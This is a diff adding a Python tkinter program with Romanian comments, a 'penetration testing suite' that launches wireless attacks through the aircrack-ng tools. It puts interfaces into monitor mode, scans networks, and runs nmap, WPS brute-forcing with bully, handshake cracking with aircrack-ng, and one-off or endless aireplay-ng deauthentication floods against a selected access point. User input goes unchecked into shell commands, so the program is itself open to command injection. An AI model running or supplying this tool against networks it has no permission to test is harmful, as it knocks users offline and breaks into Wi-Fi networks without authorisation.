@@ -1,0 +1,155 @@
+import os
+import tkinter as tk
+from tkinter import ttk, messagebox, filedialog, scrolledtext
+from threading import Thread
+
+# Configurare fereastra principala
+root = tk.Tk()
+root.title("Advanced Penetration Testing Suite - Professional GUI")
+root.geometry("1400x800")
+root.configure(bg="#1e1e1e")
+
+style = ttk.Style()
+style.theme_use("clam")
+style.configure("TLabel", background="#1e1e1e", foreground="cyan", font=("Helvetica", 11))
+style.configure("TButton", background="#333333", foreground="cyan", font=("Helvetica", 11), padding=5)
+style.configure("TCombobox", fieldbackground="#333333", foreground="cyan")
+style.configure("TEntry", fieldbackground="#333333", foreground="cyan")
+style.map("TButton", background=[("active", "#4d4d4d")])
+
+# Log de output
+def log_message(message, msg_type="info"):
+    colors = {"info": "light green", "error": "red", "exec": "yellow"}
+    result_display.insert(tk.END, f"[{msg_type}] {message}\n", msg_type)
+    result_display.tag_config(msg_type, foreground=colors[msg_type])
+
+# Functii pentru monitor mode
+def start_monitor():
+    interface = interface_entry.get()
+    if not interface:
+        messagebox.showerror("eroare", "introdu o interfata valida")
+        return
+
+    os.system(f"airmon-ng start {interface}")
+    log_message("monitor mode pornit", "info")
+    Thread(target=scan_networks, args=(interface,)).start()
+
+def stop_monitor():
+    interface = interface_entry.get()
+    if interface:
+        os.system(f"airmon-ng stop {interface}")
+        log_message("monitor mode oprit", "info")
+        wifi_listbox.delete(0, tk.END)
+    else:
+        messagebox.showerror("eroare", "introdu o interfata valida")
+
+# Scanare retele wi-fi
+def scan_networks(interface):
+    wifi_listbox.delete(0, tk.END)
+    os.system(f"timeout 5 airodump-ng {interface}mon -w /tmp/networks --output-format csv")
+    try:
+        with open("/tmp/networks-01.csv", "r") as file:
+            for line in file.readlines()[2:]:
+                if line.strip() and len(line.split(',')) > 13:
+                    bssid, channel, essid = line.split(',')[0].strip(), line.split(',')[3].strip(), line.split(',')[13].strip()
+                    wifi_listbox.insert(tk.END, f"{essid} ({bssid}) - canal {channel}")
+    except FileNotFoundError:
+        log_message("nu s-au putut scana retelele", "error")
+
+# Executare comanda
+def execute_command(command):
+    log_message(f"execut: {command}", "exec")
+    result = os.popen(command).read()
+    log_message(result, "exec")
+
+# Atacuri individuale
+def scan_nmap():
+    target = target_entry.get()
+    if target:
+        execute_command(f"nmap -A {target}")
+    else:
+        messagebox.showerror("eroare", "introdu o tinta valida pentru scanare")
+
+def brute_force_wps():
+    bssid = selected_bssid.get()
+    if bssid:
+        execute_command(f"bully -b {bssid} -v")
+    else:
+        messagebox.showerror("eroare", "selecteaza un bssid valid")
+
+def crack_handshake():
+    cap_file = filedialog.askopenfilename(filetypes=[("fisiere captura", "*.cap")])
+    wordlist = filedialog.askopenfilename(filetypes=[("fisiere text", "*.txt")])
+    if cap_file and wordlist:
+        execute_command(f"aircrack-ng -w {wordlist} {cap_file}")
+    else:
+        messagebox.showerror("eroare", "selecteaza fisiere valide")
+
+def deauth_attack():
+    bssid = selected_bssid.get()
+    if bssid:
+        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface_entry.get()}mon")
+    else:
+        messagebox.showerror("eroare", "selecteaza un bssid valid")
+
+def continuous_deauth():
+    bssid = selected_bssid.get()
+    if bssid:
+        log_message("atac deauth continuu lansat...", "info")
+        deauth_thread = Thread(target=lambda: execute_command(f"aireplay-ng --deauth 0 -a {bssid} {interface_entry.get()}mon"))
+        deauth_thread.daemon = True
+        deauth_thread.start()
+    else:
+        messagebox.showerror("eroare", "selecteaza un bssid valid")
+
+# Functie pentru oprirea atacurilor deauth
+def stop_deauth():
+    log_message("oprire toate atacurile deauth...", "info")
+    os.system("pkill aireplay-ng")  # Comanda pentru a opri toate procesele deauth
+
+# Selectarea atacurilor din combobox
+def attack_selection(event):
+    attack = attack_combobox.get()
+    if attack == "Scanare Nmap":
+        scan_nmap()
+    elif attack == "Brute-force WPS":
+        brute_force_wps()
+    elif attack == "Crack handshake":
+        crack_handshake()
+    elif attack == "Atac deauth":
+        deauth_attack()
+    elif attack == "Continuous deauth":
+        continuous_deauth()
+
+# Layout interfata
+left_frame = tk.Frame(root, bg="#1e1e1e")
+left_frame.place(x=20, y=20, width=400, height=750)
+
+ttk.Label(left_frame, text="Interfata Wi-Fi:").pack(pady=5)
+interface_entry = ttk.Entry(left_frame)
+interface_entry.pack(pady=5)
+
+ttk.Button(left_frame, text="Porneste Monitor Mode", command=start_monitor).pack(pady=5)
+ttk.Button(left_frame, text="Opreste Monitor Mode", command=stop_monitor).pack(pady=5)
+
+wifi_listbox = tk.Listbox(left_frame, bg="#2b2b2b", fg="cyan", width=50, height=30)
+wifi_listbox.pack(pady=10)
+
+right_frame = tk.Frame(root, bg="#1e1e1e")
+right_frame.place(x=440, y=20, width=920, height=750)
+
+result_display = scrolledtext.ScrolledText(right_frame, bg="#1e1e1e", fg="light green", width=100, height=30)
+result_display.pack(pady=10)
+
+ttk.Label(right_frame, text="Tinta scanare:").pack(pady=5)
+target_entry = ttk.Entry(right_frame)
+target_entry.pack(pady=5)
+
+ttk.Label(right_frame, text="Selecteaza atacul:").pack(pady=5)
+attack_combobox = ttk.Combobox(right_frame, values=["Scanare Nmap", "Brute-force WPS", "Crack handshake", "Atac deauth", "Continuous deauth"])
+attack_combobox.pack(pady=5)
+attack_combobox.bind("<<ComboboxSelected>>", attack_selection)
+
+ttk.Button(right_frame, text="Opreste toate atacurile deauth", command=stop_deauth).pack(pady=10)
+
+root.mainloop()
